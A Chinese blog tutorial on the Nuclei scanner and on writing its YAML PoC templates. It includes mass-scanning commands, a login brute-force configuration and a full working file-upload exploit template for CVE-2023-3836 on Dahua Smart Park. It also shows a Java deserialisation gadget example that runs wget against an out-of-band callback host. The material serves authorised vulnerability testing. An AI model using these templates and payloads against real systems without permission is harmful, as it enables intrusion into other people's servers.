> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [furina.org.cn](https://furina.org.cn/2023/10/05/Nuclei/)

> 一款使用 go 编写的 yaml 漏洞扫描工具。

[](#Nuclei-官方地址 "Nuclei 官方地址")Nuclei 官方地址
-----------------------------------------

官方工具文档：[https://docs.nuclei.sh/getting-started/overview](https://docs.nuclei.sh/getting-started/overview)

官方模板文档：[https://docs.projectdiscovery.io/templates/introduction](https://docs.projectdiscovery.io/templates/introduction)

官方工具 Github 仓库：[https://github.com/projectdiscovery/nuclei](https://github.com/projectdiscovery/nuclei)

官方 Poc 模板仓库：[https://github.com/projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)

[](#快速使用 "快速使用")快速使用
--------------------

验证模板格式

```
nuclei -t test.yaml --validate
```

指定模板和目标

```
nuclei -t test.yaml -u http://exam.com
```

批量扫描

```
nuclei -t test.yaml -l target.txt
```

指定代理

```
nuclei -t test.yaml -u http://exam.com -p socks5://127.0.0.1:7890
```

查看扫描进度

```
nuclei -t test.yaml -l target.txt -stats
```

Debug，查看发送数据包和返回包

```
nuclei -t test.yaml -u http://exam.com -debug
```

使用 [zoomeye](https://zoomeye.org/) 等网络空间测绘扫描

```
nuclei -t cve-2019-3911.yaml -uc -ue zoomeye -uq 'Server: Labkey' -p socks5://127.0.0.1:7890
```

使用 id 参数进行模板筛选

```
nuclei -t nuclei-templates -id '*scripting*' -u http://exam.com -p socks5://127.0.0.1:7890
```

[](#Nuclei-PoC-编写 "Nuclei PoC 编写")Nuclei PoC 编写
-----------------------------------------------

### [](#编写规范 "编写规范")编写规范

**命名规范**

漏洞命名尽量清晰准确，能对应到具体的漏洞。一般使用**组件名 + 版本 + 漏洞名称 + 漏洞编号**的方式进行命名，如`WordPress Tutor LMS < 2.0.10 跨站脚本（CVE-2023-0236）`，必要时也可以添加漏洞的触发地址，如`WordPress Tutor LMS < 2.0.10 reset_key 跨站脚本（CVE-2023-0236）`。

**无害化验证**

验证上传、RCE 等漏洞时，使用无害化验证的方式，只上传验证文件或打印输出验证命令执行，不能对扫描目标造成破坏。

例如在上传 PHP 文件的时候，就可以使用`unlink(__FILE__);`在验证后删除文件。

```
<?php
echo md5('CVE-2019-20183');unlink(__FILE__);
?>
```

**严谨性验证**

1. 打印验证

在验证文件上传和 RCE 等漏洞的时候经常会用到打印验证，使用打印输出验证的时候，尽量使用随机数再 MD5 进行验证，这样可以验证是否进行了函数调用，也可以减少误报概率。

尽量不使用 phpinfo 等页面进行验证，因为部分页面可能本身就是 phpinfo 或者包含关键字直接跳转。

2. 跨站脚本

由于 YAML 的特性，在验证 XSS 的时候为了避免过多的误报，除了 XSS 的特征以外，需要设置更多的关键字。

3.SQL 注入

尽量避免使用延时注入，耗时且非常容易因为网络原因造成误报。

4. 多条件验证

漏洞的验证需要使用多个条件进行验证，例如关键字、状态码、正则、随机数等。

5. 假设性验证

在设置匹配条件的时候需要思考，如果网站会把接收到的 payload 直接返回，是否会误报。

**精简结构**

请求头中，Nuclei 的源码中会自动配置一些内容，例如 UA，因此这些信息在编写 PoC 的时候可以省略，如果无法直接确认的信息如 referer 可以先加上，漏洞验证成功后再删除，看看还能不能验证成功，如果无影响的头信息，最好直接删除。

**跨平台**

部分 PoC 需要考虑跨平台，例如目录遍历中 Linux 系统是`etc/passwd`，Windows 系统中则是`c:/windows/win.ini`。

### [](#Nuclei-YAML-语法 "Nuclei YAML 语法")Nuclei YAML 语法

#### [](#Nuclei-PoC-结构 "Nuclei PoC 结构")Nuclei PoC 结构

Nuclei PoC 的结构主要由以下组成。

```
漏洞描述（必须）主要包括漏洞名称、漏洞描述、漏洞编号、搜索语法等组成，便于直观了解漏洞基本信息。

变量定义（非必须|常用）定义变量

数据包（必须）携带 payload 的数据包

攻击设置（非必须|不常用）模仿burp的intruder模块

请求设置（非必须|常用）例如开启重定向或 cookie 维持等，仅在当前 PoC 生效

匹配器（必须）设置命中漏洞的匹配规则

提取器（非必须|常用）提取返回包中数据的工具
```

#### [](#漏洞描述 "漏洞描述")漏洞描述

#### [](#变量定义 "变量定义")变量定义

在验证漏洞的时候经常会使用随机数 + MD5 的方式进行验证，或者使用两个数运算的方式进行验证… 这类场景就需要定义随机数变量。如果想在后文进行验证，一般也会使用变量的方式存储运算结果，最后在匹配器中再和变量值进行比对。

变量使用`variables`进行定义。这里使用`rand_base(6)`定义一个 6 位随机字符记作`random_str`，并使用`md5()`函数进行运算，将运算结果存储在`match_str`中，也可以使用`base64()`函数计算。这些函数都属于内置函数，在后面会列出。

```
variables:
  random_str: "{{rand_base(6)}}"
  match_str: "{{md5(random_str)}}"
  rand_base64: "{{base64('123456')}}"
```

其中有两个特殊变量不需要定义可以直接使用

<table><thead><tr><th>变量名</th><th>描述</th><th>例子</th><th>输出数据</th></tr></thead><tbody><tr><td>randstr</td><td>随机生成字符串</td><td><code>{{randstr}}</code></td><td><code>2ACQXhznjUrEhXdK5PqXOmNLjXh</code></td></tr><tr><td>interactsh-url</td><td>平台设置的 dnslog 服务器地址</td><td><code>{{interactsh-url}}</code></td><td><code>caetcc6am59kvd6qs9p0x3k5irbxzsyby.oast.fun</code></td></tr></tbody></table>

字符串中变量及辅助函数调用均使用`{{}}`做包含，DSL 表达式直接引用。  
变量调用：`'{{变量名}}'`

辅助函数调用：`'{{函数名(参数1,"参数2")}}'`

#### [](#数据包 "数据包")数据包

Nuclei 中发送数据包主要有两种语法结构。

> `http:`不支持低版本，`requests`兼容高版本。在低版本可以将`http:`替换为`requests:`

**raw 请求**

原始 HTTP 请求包，与 burp 等抓包工具展示的形式类似，可以按顺序发送多个请求包。

```
http:
  
  - raw:
      - |
        GET /index.php HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64('username:password')}}

      - |
        GET /getToken.php HTTP/1.1
        Host: {{Hostname}}
```

普通请求集

```
http:
  
  - method: POST 
    path: 
      - "{{BaseURL}}/login.php"
      - "{{BaseURL}}/admin.php"
    headers: 
      User-Agent: Some-Random-User-Agent
      Host: "{{Hostname}}" 
      Cookie: "PHPSESSID={{varString}}" 
    body: 
      'user=admin&pass={{md5("123456")}}'
```

<table><thead><tr><th>变量名</th><th>描述</th><th>例子</th><th>输出数据</th></tr></thead><tbody><tr><td>BaseURL</td><td>这将在请求的运行时替换为目标文件中指定的输入 URL</td><td><code>{{BaseURL}}</code></td><td><code>https://example.com:443/stats/index.php</code></td></tr><tr><td>RootURL</td><td>这将在运行时将请求中的根 URL 替换为目标文件中指定的根 URL</td><td><code>{{RootURL}}</code></td><td><code>https://example.com:443</code></td></tr></tbody></table>

#### [](#攻击设置 "攻击设置")攻击设置

设置 payloads 进行爆破，可以单独设置也可以导入字典文件，攻击方式与 burp 一致。

```
http:
  - raw:
      - |
        GET /login.php HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /login.php HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Host: {{Hostname}}

        username={{usernames}}&password={{passwords}}&Login=Login

    
    payloads:
      usernames:
        - "user"
        - "admin"
        - "test"
      passwords:
        - "./password.txt" 
    attack: clusterbomb 
    threads: 100
```

#### [](#请求设置 "请求设置")请求设置

一般写在匹配器上方，用于配置精细化的请求。

```
stop-at-first-match: true 
req-condition: true 
cookie-reuse: true
```

#### [](#匹配器 "匹配器")匹配器

匹配器用于匹配漏洞特征，验证漏洞是否存在，匹配器的编写方式决定如何判断漏洞的存在。

其中`word`、`status`、`dsl`用的最频繁。

```
matchers-condition: and 
matchers:
  - type: dsl 
    dsl: 
      - "status_code_1 == 200 && status_code_2 == 302"
      - 'all_headers_1 == "admin" && all_headers_2 == "index"'
    condition: and

  - type: word
    words: 
      - "admin.php"
      - "61646d696e2e706870"
      - "{{match_str}}"
    encoding: hex 
    
    part: header 
    condition: or 
    negative: true 

  - type: status
    status: 
      - 200

  - type: regex
    regex: 
      - '.*\admin.php.*'

  - type: binary
    binary: 
      - "61646d696e2e706870"

  - type: size
    size: 
      - 1234
```

dsl 一般用于复杂的逻辑判断，其中包含以下内置函数。

<table><thead><tr><th>变量名</th><th>描述</th><th>例子</th><th>输出数据</th></tr></thead><tbody><tr><td>content_length</td><td>内容长度标头</td><td>content_length</td><td>12345</td></tr><tr><td>status_code</td><td>响应状态代码</td><td>status_code</td><td>200</td></tr><tr><td>all_headers</td><td>返回 header 信息</td><td></td><td></td></tr><tr><td>body</td><td>返回 body 信息</td><td>body_1</td><td></td></tr><tr><td>header_name</td><td>返回 header 的 key value 信息, 全小写, 且 - 替换为_</td><td>user_agent</td><td>xxxx</td></tr><tr><td>header_name</td><td>返回 header 的 key value 信息, 全小写, 且 - 替换为_</td><td>set_cookie</td><td>xxx=xxxx</td></tr><tr><td>raw</td><td>原始的返回信息 (标头 + 响应)</td><td>raw</td><td></td></tr><tr><td>duration</td><td>请求响应时间</td><td>duration</td><td>5</td></tr></tbody></table>

#### [](#提取器 "提取器")提取器

有时候需要提取返回包的某个值，并放入下一个请求包中，或者想把某些内容输出，例如爆破成功的账号密码信息，就需要使用提取器。

`internal: true`参数比较常用，用于将提取内容当做变量使用。

```
extractors:
  - type: regex 
    regex: 
      - "token:(.*) "
    group: 1 
    
    part: body 
    name: token 
    internal: true 

  - type: json
    json: 
      - ".token"

  - type: kval
    kval: 
      - "set_cookie"
      - "PHPSESSID"

  - type: xpath
    xpath: 
      - "/html/body/div/p[2]/a"
    attribute: href 

  - type: dsl
    dsl: 
      - "len(body)"
```

#### [](#完整-Demo "完整 Demo")完整 Demo

[https://github.com/projectdiscovery/nuclei-templates/blob/62073273dfce06bbe55460503cf455367b5cdc62/http/cves/2023/CVE-2023-3836.yaml](https://github.com/projectdiscovery/nuclei-templates/blob/62073273dfce06bbe55460503cf455367b5cdc62/http/cves/2023/CVE-2023-3836.yaml)

首先通过`/emap/devicePoint_addImgIco?hasSubsystem=true`上传文件并写入 MD5 字符串，上传地址需要通过提取器提取，并拼接到第二个数据包地址中，通过访问上传的文件并验证写入的字符串验证漏洞是否存在。

```
id: CVE-2023-3836

info:
  name: Dahua Smart Park Management - Arbitrary File Upload
  author: HuTa0
  severity: critical
  description: |
    Dahua wisdom park integrated management platform is a comprehensive management platform, a park operations,resource allocation, and intelligence services,and other functions, including/emap/devicePoint_addImgIco?.
  remediation: |
    Apply the latest security patch or update provided by the vendor to fix the arbitrary file upload vulnerability.
  reference:
    - https://github.com/qiuhuihk/cve/blob/main/upload.md
    - https://nvd.nist.gov/vuln/detail/CVE-2023-3836
    - https://vuldb.com/?ctiid.235162
    - https://vuldb.com/?id.235162
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-3836
    cwe-id: CWE-434
    epss-score: 0.04304
    epss-percentile: 0.91215
    cpe: cpe:2.3:a:dahuasecurity:smart_parking_management:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: dahuasecurity
    product: smart_parking_management
    shodan-query: html:"/WPMS/asset"
    zoomeye-query: /WPMS/asset
  tags: cve,cve2023,dahua,fileupload,intrusive,rce
variables:
  random_str: "{{rand_base(6)}}"
  match_str: "{{md5(random_str)}}"

http:
  - raw:
      - |
        POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
        Content-Type: multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
        Host: {{Hostname}}

        --A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
        Content-Disposition: form-data; {{random_str}}.jsp"
        Content-Type: application/octet-stream
        Content-Transfer-Encoding: binary

        {{match_str}}
        --A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--
      - |
        GET /upload/emap/society_new/{{shell_filename}} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200"
          - "contains(body_2, '{{match_str}}')"
        condition: and

    extractors:
      - type: regex
        name: shell_filename
        internal: true
        part: body_1
        regex:
          - 'ico_res_(\w+)_on\.jsp'
```

### [](#Nuclei-内置函数 "Nuclei 内置函数")Nuclei 内置函数

以下是可在 RAW 请求 / 网络请求 / DSL 表达式中使用的所有支持的辅助函数的列表

<table><thead><tr><th>辅助函数</th><th>描述</th><th>例子</th><th>输出数据</th></tr></thead><tbody><tr><td>base64(src interface{}) string</td><td>Base64 对字符串进行编码</td><td><code>base64("Hello")</code></td><td>SGVsbG8=</td></tr><tr><td>base64_decode(src interface{}) []byte</td><td>Base64 对字符串进行解码</td><td><code>base64_decode("SGVsbG8=")</code></td><td>[72 101 108 108 111]</td></tr><tr><td>base64_py(src interface{}) string</td><td>像 python 一样将字符串编码为 base64（带有新行）</td><td><code>base64_py("Hello")</code></td><td>SGVsbG8=\n</td></tr><tr><td>concat(arguments …interface{}) string</td><td>连接给定数量的参数以形成一个字符串</td><td><code>concat("Hello", 123, "world)</code></td><td>Hello123world</td></tr><tr><td>compare_versions(versionToCheck string, constraints …string) bool</td><td>将第一个版本参数与提供的约束进行比较</td><td><code>compare_versions('v1.0.0', '&gt;v0.0.1', '&lt;v1.0.1')</code></td><td>true</td></tr><tr><td>contains(input, substring interface{}) bool</td><td>验证字符串是否包含子字符串</td><td><code>contains("Hello", "lo")</code></td><td>true</td></tr><tr><td>generate_java_gadget(gadget, cmd, encoding interface{}) string</td><td>生成 Java 反序列化小工具</td><td><code>generate_java_gadget("commons-collections3.1","wget http://{{interactsh-url}}", "base64")</code></td><td></td></tr><tr><td>gzip(input string) string</td><td>使用 GZip 压缩输入</td><td><code>gzip("Hello")</code></td><td></td></tr><tr><td>gzip_decode(input string) string</td><td>使用 GZip 解压缩输入</td><td><code>gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))</code></td><td>Hello</td></tr><tr><td>zlib(input string) string</td><td>使用 Zlib 压缩输入</td><td><code>zlib("Hello")</code></td><td></td></tr><tr><td>zlib_decode(input string) string</td><td>使用 Zlib 解压缩输入</td><td><code>zlib_decode(hex_decode("789cf248cdc9c907040000ffff058c01f5"))</code></td><td>Hello</td></tr><tr><td>date(input string) string</td><td>返回格式化的日期字符串</td><td><code>date("%Y-%M-%D")</code></td><td>2022-05-01</td></tr><tr><td>time(input string) string</td><td>返回格式化的时间字符串</td><td><code>time("%H-%M")</code></td><td>22-12</td></tr><tr><td>timetostring(input int) string</td><td>返回格式化的 unix 时间字符串</td><td><code>timetostring(1647861438)</code></td><td>2022-03-21 16:47:18 +0530 IST</td></tr><tr><td>hex_decode(input interface{}) []byte</td><td>十六进制解码给定的输入</td><td><code>hex_decode("6161")</code></td><td>aa</td></tr><tr><td>hex_encode(input interface{}) string</td><td>十六进制编码给定的输入</td><td><code>hex_encode("aa")</code></td><td>6161</td></tr><tr><td>html_escape(input interface{}) string</td><td>HTML 转义给定的输入</td><td><code>html_escape("test")</code></td><td>test</td></tr><tr><td>html_unescape(input interface{}) string</td><td>HTML 取消转义给定的输入</td><td><code>html_unescape("&lt;body&gt;test&lt;/body&gt;")</code></td><td>test</td></tr><tr><td>len(arg interface{}) int</td><td>返回输入的长度</td><td><code>len("Hello")</code></td><td>5</td></tr><tr><td>md5(input interface{}) string</td><td>计算输入的 MD5（消息摘要）哈希</td><td><code>md5("Hello")</code></td><td>8b1a9953c4611296a827abf8c47804d7</td></tr><tr><td>mmh3(input interface{}) string</td><td>计算输入的 MMH3 (MurmurHash3) 哈希</td><td><code>mmh3("Hello")</code></td><td>316307400</td></tr><tr><td>print_debug(args …interface{})</td><td>打印给定输入或表达式的值。用于调试。</td><td><code>print_debug(1+2, "Hello")</code></td><td>[INF] print_debug value: [3 Hello]</td></tr><tr><td>rand_base(length uint, optionalCharSet string) string</td><td>从可选字符集生成给定长度字符串的随机序列（默认为字母和数字）</td><td><code>rand_base(5, "abc")</code></td><td>caccb</td></tr><tr><td>rand_char(optionalCharSet string) string</td><td>从可选字符集中生成随机字符（默认为字母和数字）</td><td><code>rand_char("abc")</code></td><td>a</td></tr><tr><td>rand_int(optionalMin, optionalMax uint) int</td><td>在给定的可选限制之间生成一个随机整数（默认为 0 - MaxInt32）</td><td><code>rand_int(1, 10)</code></td><td>6</td></tr><tr><td>rand_text_alpha(length uint, optionalBadChars string) string</td><td>生成给定长度的随机字母字符串，不包括可选的割集字符</td><td><code>rand_text_alpha(10, "abc")</code></td><td>WKozhjJWlJ</td></tr><tr><td>rand_text_alphanumeric(length uint, optionalBadChars string) string</td><td>生成一个给定长度的随机字母数字字符串，没有可选的割集字符</td><td><code>rand_text_alphanumeric(10, "ab12")</code></td><td>NthI0IiY8r</td></tr><tr><td>rand_text_numeric(length uint, optionalBadNumbers string) string</td><td>生成给定长度的随机数字字符串，没有可选的不需要的数字集</td><td><code>rand_text_numeric(10, 123)</code></td><td>0654087985</td></tr><tr><td>regex(pattern, input string) bool</td><td>针对输入字符串测试给定的正则表达式</td><td><code>regex("H([a-z]+)o", "Hello")</code></td><td>true</td></tr><tr><td>remove_bad_chars(input, cutset interface{}) string</td><td>从输入中删除所需的字符</td><td><code>remove_bad_chars("abcd", "bc")</code></td><td>ad</td></tr><tr><td>repeat(str string, count uint) string</td><td>重复输入字符串给定的次数</td><td><code>repeat("../", 5)</code></td><td>../../../../../</td></tr><tr><td>replace(str, old, new string) string</td><td>替换给定输入中的给定子字符串</td><td><code>replace("Hello", "He", "Ha")</code></td><td>Hallo</td></tr><tr><td>replace_regex(source, regex, replacement string) string</td><td>替换与输入中给定正则表达式匹配的子字符串</td><td><code>replace_regex("He123llo", "(\\d+)", "")</code></td><td>Hello</td></tr><tr><td>reverse(input string) string</td><td>反转给定的输入</td><td><code>reverse("abc")</code></td><td>cba</td></tr><tr><td>sha1(input interface{}) string</td><td>计算输入的 SHA1（安全哈希 1）哈希</td><td><code>sha1("Hello")</code></td><td>f7ff9e8</td></tr><tr><td>sha256(input interface{}) string</td><td>计算输入的 SHA256（安全哈希 256）哈希</td><td><code>sha256("Hello")</code></td><td>185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969</td></tr><tr><td>to_lower(input string) string</td><td>将输入转换为小写字符</td><td><code>to_lower("HELLO")</code></td><td>hello</td></tr><tr><td>to_upper(input string) string</td><td>将输入转换为大写字符</td><td><code>to_upper("hello")</code></td><td>HELLO</td></tr><tr><td>trim(input, cutset string) string</td><td>返回一个输入切片，其中包含在 cutset 中的所有前导和尾随 Unicode 代码点都已删除</td><td><code>trim("aaaHelloddd", "ad")</code></td><td>Hello</td></tr><tr><td>trim_left(input, cutset string) string</td><td>返回一个输入切片，其中包含在 cutset 中的所有前导 Unicode 代码点都已删除</td><td><code>trim_left("aaaHelloddd", "ad")</code></td><td>Helloddd</td></tr><tr><td>trim_prefix(input, prefix string) string</td><td>返回没有提供的前导前缀字符串的输入</td><td><code>trim_prefix("aaHelloaa", "aa")</code></td><td>Helloaa</td></tr><tr><td>trim_right(input, cutset string) string</td><td>返回一个字符串，其中包含在 cutset 中的所有尾随 Unicode 代码点都已删除</td><td><code>trim_right("aaaHelloddd", "ad")</code></td><td>aaaHello</td></tr><tr><td>trim_space(input string) string</td><td>返回一个字符串，删除所有前导和尾随空格，由 Unicode 定义</td><td><code>trim_space(" Hello ")</code></td><td>“Hello”</td></tr><tr><td>trim_suffix(input, suffix string) string</td><td>返回没有提供的尾随后缀字符串的输入</td><td><code>trim_suffix("aaHelloaa", "aa")</code></td><td>aaHello</td></tr><tr><td>unix_time(optionalSeconds uint) float64</td><td>返回当前 Unix 时间（自 1970 年 1 月 1 日 UTC 以来经过的秒数）以及添加的可选秒数</td><td><code>unix_time(10)</code></td><td>1639568278</td></tr><tr><td>url_decode(input string) string</td><td>URL 解码输入字符串</td><td><code>url_decode("https:%2F%2Fprojectdiscovery.io%3Ftest=1")</code></td><td></td></tr><tr><td>url_encode(input string) string</td><td>URL 对输入字符串进行编码</td><td><code>url_encode("https://test.com?id=1")</code></td><td></td></tr><tr><td>wait_for(seconds uint)</td><td>暂停执行给定的秒数</td><td><code>wait_for(10)</code></td><td>true</td></tr><tr><td>to_number(input string) float64</td><td>将数字型字符串转换为 float64 类型</td><td><code>to_number("123456")</code></td><td>123456</td></tr><tr><td>to_string(input interface{}) string</td><td>将数据转换为字符串类型</td><td><code>to_string(123456)</code></td><td>“123456”</td></tr><tr><td>rand_ip(input string)</td><td>根据输入网段随机返回一个 ip 地址</td><td><code>rand_ip("192.168.1.1/24")</code></td><td></td></tr></tbody></table>